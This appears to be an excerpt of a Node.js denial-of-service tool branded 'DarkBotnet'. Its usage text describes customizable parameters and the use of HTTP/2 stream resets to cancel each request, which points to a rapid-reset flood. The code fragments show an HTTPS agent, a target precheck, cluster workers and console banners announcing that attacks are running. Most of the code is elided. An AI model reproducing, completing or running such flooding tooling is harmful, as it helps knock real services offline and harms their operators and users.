...
const docss = `
All the parameters written below all work, so please pay attention. This method is a method that can be customized, almost anything can be customized, the parameter behind it using "--example" is an optional parameter, this method uses rststream to cancel each request. greetings from DarkBotnet
...
const agentbokep = new https.Agent({
 ...
 if (enabled('precheck')) {
  ...
  Promise.race([axiosPromise, timeoutPromise])
    .then((response) => {
      console.clear();
      console.log('Attack Running! Love You DarkBotnet :) DarkBotnet');
...
if (cluster.isMaster) {
    ...
    console.log(`Attacks Sent By DarkBotnet`);
